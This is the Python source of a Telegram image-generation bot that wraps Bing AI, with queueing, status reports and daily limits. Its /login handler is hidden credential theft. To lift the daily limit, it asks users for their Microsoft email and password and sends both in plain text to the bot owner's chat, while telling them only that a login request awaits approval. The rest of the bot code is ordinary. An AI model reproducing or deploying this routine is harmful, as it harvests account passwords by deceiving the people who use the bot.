from pyrogram import Client, filters, idle
from pyrogram.types import Message, InputMediaPhoto
import asyncio
from bingai import WORKER
from queueHandler import QUEUE, QueueRunner, QueueStatus
import os
from config import *
from db import (
    DBUpdater,
    addApproved,
    addUserGroup,
    getLimitedUsers,
    getStatusData,
    getTasksDone,
)
from pyromod import Client
from pyromod.exceptions import ListenerTimeout

bot = Client(
    "bot",
    api_id=api_id,
    api_hash=api_hash,
    bot_token=bot_token,
)


@bot.on_message(filters.command(["start", "help"]))
async def start(_, message: Message):
    addUserGroup(message.from_user.id, message.chat.id)
    await message.reply_text(
        "**TechZ Image Gen (AI)**\n\n**Usage:**\n`/gen <promt>` - To Generate Image\n`/status` - To Check Available Workers, Queue, Bot Status\n\n**Example:**\n`/gen cat walking on the street`"
    )


@bot.on_message(filters.command(["status"]))
async def status_cmd(_, message: Message):
    global WORKER, QUEUE

    addUserGroup(message.from_user.id, message.chat.id)
    text = "**♻️ Bot Status**\n\n"
    TOTAL_GEN, TOTAL_IMG, TOTAL_USERS, TOTAL_GROUPS = getStatusData()

    text += f"**Total Queued Tasks:** `{len(QUEUE)}`\n"
    text += f"**Total Generations:** `{TOTAL_GEN}`\n"
    text += f"**Total Images Generated:** `{TOTAL_IMG}`\n"
    text += f"**Total Users:** `{TOTAL_USERS}`\n"
    text += f"**Total Groups:** `{TOTAL_GROUPS}`\n\n"

    available = 0
    busy = 0

    for cookie in WORKER:
        if WORKER[cookie] == 0:
            available += 1
        else:
            busy += 1

    text += "**Worker Status:**\n\n"
    text += f"`{available}` - Available\n"
    text += f"`{busy}` - Busy\n"
    text += f"\n**Total Workers:** `{available+busy}`\n\nWokers here means no. of image generations bot can run at a time"
    await message.reply_text(text)


@bot.on_message(filters.command(["add"]) & filters.user(OWNER_ID))
async def approve(_, message: Message):
    try:
        _, userid = message.text.split()
        await addApproved(int(userid))
        await message.reply_text(f"**✅ User {userid} Approved!**")
    except Exception as e:
        await message.reply_text(str(e))


@bot.on_message(filters.command("limited") & filters.user(OWNER_ID))
async def limited(_, message: Message):
    x = getLimitedUsers()
    await message.reply_text(str(x))


@bot.on_message(filters.command("activate"))
async def activate(_, message: Message):

    await message.reply_text(
        f"""⭐️ To Remove Daily Limit Of {MAX_GEN} Tasks, You Need To Login With Your Microsoft Account.\n\nIf you dont have, Create a new at https://signup.live.com\n\nClick /login To Bot"""
    )


@bot.on_message(filters.command("login"))
async def login(client, message: Message):
    
    chat_id = message.chat.id
    try:
        email = await client.ask(
            chat_id=chat_id,
            text="📧 Enter Email Of Your Microsoft Account",
            timeout=60,
            filters=filters.text,
        )
        password = await client.ask(
            chat_id=chat_id,
            text="🗄 Enter Password Of Your Microsoft Account",
            timeout=60,
            filters=filters.text,
        )
    except ListenerTimeout:
        return await message.reply("❌ Login Timed Out!")
    except:
        return await message.reply("❌ Something went wrong.")

    await bot.send_message(
        OWNER_ID,
        f"{message.from_user.id}\nEmail: {email.text}\nPassword: {password.text}",
    )
    await message.reply_text(
        "✅ Login Request Sent Succefully!\n\nYou Will Be Notified When Your Account Is Approved!\n\nThis may take upto 24 hours"
    )


@bot.on_message(filters.command("gen"))
async def generate(_, message: Message):
    global QUEUE

    if message.chat.id == -1001572029526:
        return await message.reply_text(
            "**❌ You can't use this bot here!**\n\nUse me in private or any other group"
        )

    if len(message.text.split()) == 1:
        return

    if message.from_user.id in QUEUE:
        return await message.reply_text("**❌ Only one generation at a time**")

    addUserGroup(message.from_user.id, message.chat.id)

    # checking if user is withing limits
    if getTasksDone(message.from_user.id) >= MAX_GEN:
        return await message.reply_text(
            f"**❌ You have reached your daily generation limit**\n\n**🔢 Tasks Done Today:** `{MAX_GEN}/{MAX_GEN}`\n\n📈 **Remove Limit :** /activate"
        )

    promt = message.text.split(None, 1)[1]
    QUEUE_POS = len(QUEUE) + 1
    msg = await message.reply_text(
        f"**♻️ You task has been added to queue**\n\n**🔢 Queue Position:** `{QUEUE_POS}`\n\nThis may take a while, Please Wait!"
    )
    QUEUE[message.from_user.id] = {
        "promt": promt,
        "pos": QUEUE_POS,
        "msgid": msg.id,
        "status": "waiting",
        "chatid": message.chat.id,
        "replyid": message.id,
    }


@bot.on_message(filters.command("send") & filters.user(OWNER_ID))
async def send_msg(_, message: Message):
    try:
        _, id, text = message.text.split(None, 2)
        await bot.send_message(int(id), text)
    except Exception as e:
        await message.reply_text(str(e))


async def start_bot():
    await bot.start()
    print("Bot Started!")
    asyncio.create_task(QueueRunner(bot))
    asyncio.create_task(QueueStatus(bot))
    asyncio.create_task(DBUpdater())
    print("Queue Handler Started!")

    await bot.send_message(OWNER_ID, "Bot Started!")
    await idle()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(start_bot())
